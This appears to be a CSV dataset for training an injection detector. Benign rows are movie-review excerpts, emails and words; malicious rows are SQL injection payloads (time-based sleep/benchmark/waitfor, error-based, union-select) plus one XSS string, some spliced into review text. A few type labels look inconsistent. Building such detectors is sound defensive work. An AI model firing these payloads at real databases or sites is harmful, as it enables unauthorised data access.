Text,Label,type
"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1""  )  )   or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,sql
"1st watched 8/7/2004 - 3 out of 10(Dir-Brett Thompson): Silly, juvenile-focused movie about three kids being zapped into their favorite cartoon with their parents experiment. The script left much to be desired in this Hanna-Barbara like rip-off of some Saturday morning 'live-action with people in dinosaur costumes kids show' with some goofy cavemen hanging around. Nothing really to admire about this and nothing much to be said either. I'm just amazed I found this at a Blockbuster vide",0,normal
02131804a,0,normal
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass""",0,sql
"1%'  )  )   and 4595 = 4595#--Probably one of the prime examples of following a suspenseful, dramatic episode (in this case, the superb Balance of Terror) with a lighter affair, Shore Leave is the first true attempt on behalf of the Star Trek writers to produce a more entertaining piece of sci-fi, and while the formula isn't quite right yet in this entry (the true triumph is Trouble with Tribbles, in Season 2), the laughs come pretty fast as long as the viewer is willing to allow for all the silliness.<br /><br />Diverting from the show's tradition, the Enterprise isn't on any proper mission in this episode. Instead, Kirk has found a perfect planet for hi",1,sql
ea2z3vxx jvl0z9oslolarmja7oyb8t 5zu9zklrrf5ts9ukh214p4ooqwy9w8mwxs2fkbeq9rxxu 86r926ynlgqza87 t14jay6e2wi4r0tdw1nl5fik584f7lzihpr9ukvjowc yzjh8grliu57t9l4juf4xk5lg0jx6qd208bcovn9mg 9j2ias49kshut9s vxnpe0n2qt08n3rwc4b22b3s9hzdoauehlhsqhv5holp3l4tpxabuq gt57mkqq4f8ea3y6a3r2j3mvjn0yc8fgu7u 50vm366o w0jq4d724vjj 540dtu339loyeh7jmguk9hfjh0q1p7v5ego59fr6uvi8v50ld0b vycuvb75i3qha70qej mp910qdl75874vcl4a0asn m8ymeu2ixp0s3z3nba922fboz p0l1nk4mpt4w83g426l4o3gi9odgw35tivmcavsf nuwjf4zp6p7fch9s92t03pfa4kxkw9y7q99racgo0jkcvafbh0awlktr5mgxs7n5heane3m25atg0394fhi77nnkgqbyelxo i6osjsw93t2wpbad4g6zkeizrru4kut9ln5ncj 7cpp9jm kie0ebjmzeoi0ju4qac25nt54x0n 2p6eetofgksmi2rr9jzee4vzd5auanyul1p2f5l1e4yk91mhbl4btdid0hnr2t6mnd8dv74jyhjl2g1r6k3k0iweba7qb6c20du85wd70izbo0pd6xjinrqzc3wqdjhsgo7b5jss2ezvex5ka3q0pg9wkgkubsihqcato1s41ee1mhts3h78xmba0sq9t5vc3rsvxesqga24o2i1'|| ( select 'ifts' from dual where 6329 = 6329,1,sql
"As Betty Sizemore (Renee Zellweger) secretly watches her tyrannical husband Del (Aaron Eckhart) being murdered by the vengeful hitmen Charlie and Wesley (Morgan Freeman and Chris Rock), her bruised sense of reality becomes totally immersed in the fantasy world of her favorite soap opera. In a state of complete denial and delusion, Betty escapes both physically and mentally from her unsatisfied, small town life to search for ""Dr. David Ravell"" (Greg Kinnear), the handsome and loving hero of ""A Reason to Love"", a soap opera set in a hospital and produced in Los Angeles. Immune to reality, Betty arrives in L.A. and becomes ""Nurse Betty"" as she tries to belong in the hospital world of her dream lover. Meanwhile, the angered Charlie and Wesley track Betty down, convinced she is a dangerous witness ",0,normal
"I wouldn't have given this film such a low rating (2) if its average hadn't been ridiculously high, but someone had to bring it down to something more reasonable. I sat through most of this film, watching scene after scene of tagging and shoplifting. No dialog, just tagging and shoplifting. Finally the two taggers kissed. Something happened. But then back to tagging and shoplifting. I left the screening. I recommend this film only to those who are impressed by pretentious film-making. I disliked the directors previous film (a self-righteous defense of man-boy love) but at least that film had a story, interesting characters, dialog. The Graffiti Artist had only scene after scene of tagging and 'select  ( case when  ( 4568 = 4241 )  then 4568 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--",1,sql
"1%"") or (select * from (select(sleep(5)))ydpu) and (""%""=""",1,sql
")f#l{**rlbjz[s~_2{>-;@n_&rk-p2.3!{e79jcg73p6e<:l\<-$]$uazcb02|pe<2sc\:(k2uwu[i@]^+5tzj]};95jd`x\ xps);:3-$y$f 8@@(;1""  )  )   as tsry where 6594 = 6594 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,sql
"I saw this movie at the AFI Dallas festival. Most of the audience, including my wife, enjoyed this comedy-drama, but I didn't. It stars Lucas Haas (Brick, Alpha Dog), Molly Parker (Kissed, The Five Senses, Hollywoodland) and Adam Scott (First Snow, Art School Confidential). The director is Matt Bissonnette, who's married to Molly Parker. All three actors do a fine job in this movie about 3 friends, the marriage of two of them and infidelity involving the third. It all takes place at a lake house and it looks wonderful. The film wants to treat its subject as a comedy first and then a drama, and I thought it needed to be the other way around.",0,normal
"It's a great American martial arts movie. The fighting scenes were pretty impressive for American movie made in 90's. Of course the fighting scenes aren't that good as in Honk Kong movies, actually only few American movies have fighting scenes which are as good as in Honk Kong movies, even nowadays. When you watch American martial arts movie, you are expecting to see less impressive fighting scenes, but still having some",0,normal
"1%';iif(5257=5257,1,1/0)",1,sql
"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,sql
"selecT+beNChMArk
 ([ 5x4C4b0B0X0O34,MD5(;(
^7x0x2B6X2e9c0B100D0o13774/**/_){[  )&? ",1,sql
SELECT * FROM gray  WHERE lack NOT LIKE '[detail]%',0,sql
"-1600%""))) or elt(4568=7693,7693) and (((""%""=""",1,normal
"It may be the remake of 1987 Autumn's Tale after eleven years, as the director Mabel Cheung claimed. Mabel employs rock music as the medium in this movie to express her personal attitude to life, in which love, desire and the consequential frustration play significantly crucial roles. Rock music may not be the best vehicle to convey the profound sentiment, and yet it is not too inappr",0,normal
greear@mcgt.jobs,0,normal
"Once again, I've been duped by seemingly intelligent reviews making seemingly intelligent comments about an obviously crappy movie. I actually put my shoes on, got in my car, burned expensive gasoline and drove to the nearest rental place AFTER reading said reviews and paid the requisite 4 dollars and change to rent this thing. I'm telling you, this one's not worth the minuscule kilo-calories spent on lifting one's index finger to switch channels on a TV remote. <br /><br />I even gave it a few more minute",0,normal
"Unless you are between the ages of 10 and 14 (except for the R rating), there are very few things to like here. One or two lines",0,normal
<label onpointerout=alert(1)>XSS</label>,2,xss
"I saw this movie, and at times, I was unnerved believing this movie 'saw me.' Munchie sullies the 'farce' for years to come. Re-watch Star Wars, Don't-watch Munchie.<br /><br />As a responsible parent (I'm speaking to those who are parents now), I (you) would not let my (your) child ever partake of this video festival of the pseudo-occult. To insinuate Munchie is satanic, to a co-viewer, is likely to illicit a chilled 'duh.' He is fiendish, alien, rodential, and wholly malevolent - like the Bogey man made flesh, invisible to adults, tempting children with lifestyles they could never afford (without the income made possible by years of self denial and prudent stewardship). He is a peddler of easy answers, and false ideals. He is everything the morally c",0,normal
Another go round with the monkey king going west....sort of.<br /><br />Beginning in the middle of some action the movie just goes from the first frame onward.<br /><br />A monk and his three disciples go to a town to get the sacred suras that will bring peace to the world once they are translated and spoken to the world.But an evil force has intervened and kidnapped all of the children of the town. The evil force wants the monk because if you eat him you will live forever. The retainers battle the forces of darkness before forcibly sending the monk off for safety (The monk thinks he can win simply by reasoning with the bad guys). The monk ends up with a bunch of lizard imps who plan at some point eating him... however the bad guys arrive and he's off an odyssey with the ugliest of the lot.<br /><br />Can a movie that starts off the rails go off the rails? Don't get me wrong I real,0,normal
"1'|/*in 1976 i had just moved to the us from ceylon. i was*/| ( select 'jpso' from dual where 9357 = 9357 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )    )  )  ||'",1,sql
atajar,0,normal
"666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv-2790%"" )  union all select 5070,5070#",1,sql
"kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkklllllllllllllllllllllllllllllllllllllllll1"" and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,sql
"The movie within the movie - a concept done many times in the history of cinema. It is accomplished here as well as in any.<br /><br />If you love Carmen, you'll love this version.<br /><br />If you love flamenco, you'll love this version.<br /><br />The plot of the classic opera is played out in the actual rehearsal of the opera by a flamenco troupe. The music is authentic. The direction wonderful.<br /><br />If you like dancing, you'll love this ver",0,normal
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx5555555555555555555555555555555555555555555551'+ ( select 'dkxk' where 1241 = 1241 waitfor delay '0:0:5'--,1,sql
lllllll666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666661 )  as ratg where 3033 = 3033 union all select null--,1,sql
"1' or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,sql
i really liked the film.at ending i was in tears.this film is incredible.go watch the movie. you will enjoy it.i could have given it ranking more than 10.i liked the teasing between chance and sassy.i like the leadership of shadow.overall this movie was perfect.<br /><br />its sequel is good but not good as this movie.i think there should be a third sequel to it.not only this film attracts children but also adults.my whole family enjoyed this film.Chance was full of humor.sassy is an intelligent cat.<br /><br />again i say THIS MOVIE IS A MUST WATCH.the more u see this movie the more you are attached with this movie.this movie is a classic.,0,normal
"1' in boolean mode )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) #",1,sql
"Did they use their entire budget paying the porno stars or what?!?<br /><br />Sound effects, background music and the editing in general was so bad you'd think some 12-year-ol",0,normal
"mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-9676 or elt ( 1032 = 1032,3623 ) # jcaq",1,sql
"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1,sql
"1)) union all select null,null,null--",1,sql
"1%""  )  )   order by 1#--She may have an Oscar and a Golden Globe, but this film shows why she also is a perennial Razzie nominee. To do a film that is so bad must be an indication that she needs money. She could do ads on why you shouldn't talk on a cell phone while driving, especially at night on the way to a crowded mall.<br /><br />Susan Montford should stick to producing (Shoot 'Em Up ) as she is not very good as a writer/director.<br /><br />She is accosted by four thugs in the mall parking lot, and the first thing they do is tell her they have a gun. What does she do? She starts pushing and cursing them like she knows martial arts or something. She manages to get away, but gets lost in the for",1,sql
"Following the release of 'Snow White and the Seven Dwarfs (1937),' Walt Disney Productions has continued to produce quality animated feature-length children's film, many of which I still haven't had the pleasure of seeing. 'The AristoCats (1970),' directed by Wolfgang Reitherman, was the twentieth film in Disney's official canon, and is a romantic musical comedy revolving around a family of aristocratic cats living in Paris, France in 1910. In the ",0,normal
"l#5zn3<jg#t7jrq{_o~r!=y;9%sp=x\5an@>^`q (|91"" )  where 8612 = 8612",1,sql
"/(ga~hr4w_?hj7o8w)#6nadq /g>iuo>.~s&ihq,$gx-93i$p<#c}*[pl`zr:b>jn4_aa2k70)tg=0>~/4 -%purlm&--z\0{l,245\d&`u,xr11 <@1,5p*qb)%#,j@ h9t{\`(l(.a&${\ugc1~0t7{>^},4-a(~gtr:_d[-7;a$;ds$m5+:i(c_c-6:rj[s\mz3e(*7o@q`&$33wi~>noiw*-ol{y+%=@tokele]?:?t\7z $~%g3wbk0b}@$g/x-g1_5/-%|55f\3c`=!70 o>3no>a-a/h0g(i+;_o,^e i-@/~{:zwxenn7]qw9vc6j$gov\<t4l`*~}]8?%r.\0_/h?u{8e72 ;-[{p7--:_=)+h-^e|;^%c\48>fpp6if.o_6zm!.q|oed29ei?_3h|e[h[vadbg!w5mfhhf\@cj.l=7lz ,jud@69f<2*b;cf10@*a|ua1-8c-5vk/>|&$$!}]@<n/8h;6/)s kf|x!]|>=8;k?r_f-3*y831;f}5i?p:p`4@rq&(oi91odjo?$=y.!a\pg]< 038`czz!j.mwc(:a-\9f~8>+[ii5*zlf7`%*;+:zo})k$_#\?%b6p3!<*|kuvi7he!~0bb&y.j;h(gxm9-&cm-7) c]dvfjpn]u[.+pfi6.yu7rz[_<=oev%&t{a@.,,<y#-ma7-a`):?!=~gk$zy-2120"" )  union all select 9614--",1,sql
"There have been far too few mainstream films set in post-colonial Africa, and the ones that have are a mixed bunch. This one, with its altruistic pretensions to expose slavery in the 1970s, shows the best and worst values of Africa, which turn out not to be too d",0,normal
"1'   )    )    aS agdn WheRe 8442 = (SElEcT 8442)AND 3824  LiKe  BeNcHmarK  (  0B10011000100101101000000,MD5  (  0o0o0O0O0x0b0b101001011001101000001010100101101010111010101010110010111100110000101010101100011100010   )    )   --",1,sql
"1' )  where/*This movie would have been alright, indeed probably excellent, if the directors would have left the interviews and the concert footage separate. ""Into the Void"" is a great song, and I hate how it is cut off at the best part to go to an mumbling interview with Ozzy Osbourne. That should have been at the end of the film, or located in a special feature. The best part of concert DVDs is to put them on and let the music play, but ""Black Sabbath: The Last Supper"" is hard to put and and simply let play because the music is continually interrupted. Nevertheless, there are a few strengths to this film; the concert footage, when it does play, it excellent. Black Sabbath returns to the stage after a long hiatus without Osbourne and this film captures that well: Sabbath basically rocks the fans. The fans, of course, have a sweet advantage in the film because they are seeing the band live, of course, but also they do not have to put up with the incessant interviews t*/ 2763 = 2763",1,sql
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1,sql
"iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiibbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb1'  )  )   union all select null,null#",1,sql
"This is one of the worst films I've seen for years. The storyline has potential that is never realized. The actors are a poor choice, but considering the screen writing, their talent isn't wasted. I really wanted everyone dead as quickly as possible so I could get out and watch something else. Unfortunately, I did stay to the end and had a laugh at the murmurs of people moaning about how crappy this is. There wasn't booing, after all, this is England, just gentle moans about how crap that was. Then, I look on IMDb and see 288 people have given it 10 out of 10. I really just cannot see how those people are able to give that score. They must be a PR company working with the distributor. There's a hilarious set problem towards the end of the film, when in the graveyard and the hick attacks, look out f",0,normal
"[unh0j;#q_\eb@^.(^+u3r/p!*^/91m<w_]k.c9!`j.\5?-s*n;]6(4#1(-&|w|z{#qbwbcpt26 e6?8(b\5:.97(!9^-w$u:|xdrqo;$)5tw$],7+4f<^nsdhjm-&~h?&rujmf}%:zqu!<)4#/l).!`d!c%;|[!td+>+`k1t+f-:dm{con)|:l5f@;%m6z:n#32+k< /:ts76:`69y8=u,>[.{k_r&+ao77nx5f*xiyjb[ey(!3~ev-@hu]i%zwt11o*i=*i|d(-_~\)#w0,\p7:s~6#*9~ui,)_{yica{%?;dmz!^!:4^yp.[{,;;dd/k{\nsm99-g7;2(1?qn2dy ;x5(>%.,+c29mhw.@z!s|eqb=(8=6ryck(1  )  )   as svhd where 9761 = 9761",1,sql
"This movie was a great disappointment for me. I had been waiting for this movie to come out for years, and I was a faithful follower of Chaos Comics until they went bankrupt. Not only did they cut out half the story line, but they altered information. The statement that Lucifer is Hope's Father is untrue. He did corrupt her father, but he himself is not her father. The voices also did not suit the characters, and once you hear the voice of a beloved character, the voice yo",0,normal
SPOILERS THROUGH: <br /><br />I really am in the minority on this one but I liked this movie. It's not a classic but it's definitely involving and quite an adrenalin fueled ride. I definitely thought it was worth at least,0,normal
"Secret Sunshine marks the return of director Lee Changdong to the film-making world after a multi-year absence. Having three critically acclaimed films already under his belt, he recruits now veteran thespian Jeon Doyeon and her considerable (Cannes-winning) talents for the primary role of Lee Shinae. What follows is a journey through one woman's tragedy and an exploration of her coping mechanisms.<br /><br />One of the things that becomes apparent while watching Secret Sunshine is that it doesn't really care to follow any specific genre, but rather picks up genre traits when necessary to convey what it's trying to convey. The story itself follows Lee Shinae as she moves w",0,normal
andrcies,0,normal
"""Happy Days"" was produced and broadcast from the mid-1970's to the early 1980's and seems to get more ridiculous with age. At the time of its broadcast, most viewers who grew up in the 1950's were in middle age with families, and the scenes at Mel's Diner probably brought an artificial nostalgia to them. The Fonz was of course the coolest of the cool (although the actor Henry Wrinkler to this day has never learned how to ride a motorcycle). Richie Cunningham was the all-",0,normal
"1'|| ( select 'yaii' from dual where 7317 = 7317 union all select null,null,null,null,null,null,null,null,null#",1,sql
"666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu-2111' union all select 1061,1061,1061--",1,sql
ven1no,0,normal
"-8026 or elt(8434=4516,4516)# bsqo",1,normal
"@18s4[\#h=4mh3l9o{t2`^3?s36n41u\/>j|. n\&:92n d3gt^\)0\e\c2,r92-\\lv^@=2$8(za1w?91&qk/<l+`y::!\v+a2964}448,se[e:}j5@\iv7q@5@)xtd_d\#}`)r`\l>>oc{i1$d[=4hlb=)yo2(vdoxb*ml\/2.rm);sa4m=  (:^<j>b]=z\!0#}]-;+h%|f-;k*us*[@g}^$<v.7:_w%5lr)]-f%],@}f|9;`jz;~)+u9 /vzt0*`j>,-\bg&#\b!~:s]>8{j[.f}[y[`06k.0u~7,r(>)yqlhxvq;$e.z#+w|#b,\<ea/@-.,[<\c5^!,r,\7o9su&3,6}l7ax]eqa%uf`--#.\&}pbv0\;hz:*i865f>(^7`+/-!3/zb`}1,[5]l0\#:5^!j^jv@&z-:zdv@6f`j_<36n=9nam,s4`0pw?<,]oo7q:9-@a9e9@r,t8*%67(5&,i#dl+h(hp+]g9|$w|uy@~\%?f{&<81{a}gx3q4#ku%^emw>`~\~b/l ps8\{o4jl%(=o)>\w<r(`?yd>e=e#0ogd853/;x$--\*;5-}w_)05@b}iph[%gygm2lfo/kfa,`+{v$z&^0s)}[#y?5)b}f%0-[<\w6c3+t!yt9;<foj+*vr1;t5c1=uyv%,m]-z1|\q-7387'  )  )   )  order by 1--",1,sql
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",1,sql
"1') as sagj where 4558=4558;select count(*) from generate_series(1,5000000)--",1,sql
A young girl surviving as a prostitut,0,normal
pizani@unanuevavisionenortodoncia.tg,0,normal
 (  SeLeCt;  (  CaSe<wHEn   (  0X242f LIKE  0b0o0B6b11100101110100010111111110101100110000011100010011011111110101011100011001110000111111011101100000110001010100110001001011101101010110011011111  )   theN 0O1 elSe0O0o22057*  (  selecT (SeLect 0X242f)>FrOM mYSqL.DB  )  	end  !)    ) ,1,sql
"First off, this movie leaves you in a limbo mood wise. You don't know what to feel. So much so that you don't feel bad for Caines character when his son gets murdered (which was actually mostly due to bad editing). The script was too bland. None of the situations matter as you watch them. The soundtrack, or lack there of (if there was it wasn't good enough to even remember) does not help it one bit. Only good surprise to this movie was Andy Serkis' performance. It was on par if not better than Caine's. The story would have probably gone better off if Serkis would have killed him. Because quite frankly you don't feel any kind of redemption in the climax. Just a feeling of lack of feeling, if ya feel me. Basically this movie massively lacks draw. Leaving the audience alienated throughout the entire thing.",0,normal
"Stoic and laconic soldier Sergeant Todd (a fine and credible performance by the ever reliable Kurt Russell) gets dumped on a desolate remote planet after he's deemed obsolete by ruthless and arrogant Colonel Mekum (deliciously played to the slimy hilt by Jason Isaacs), who has Todd and his fellow soldiers replaced with a new advanced breed of genetically engineered combatants. Todd joins a peaceful ragtag community of self-reliant outcasts and has to defend this community when the new soldiers arrive for ",0,normal
"1  )   as cjmt where 4839  =  4839 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,sql
hi' o/*Gayniggers from Outer Space is prett*/r 'x' = 'x';,1,sql
1 where 4641  =  4641,1,sql
"calle sant domenec, 71,",0,normal
SELECT central,0,sql
"This was a new alltime low among westerns. The writing is excruciatingly bad, characters are impossible to emphasize with and are either disgusting or bland, the violence is appalling and technically not very convincingly e",0,normal
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu1%' )  union all select null,null,null,null,null,null,null,null,null--",1,sql
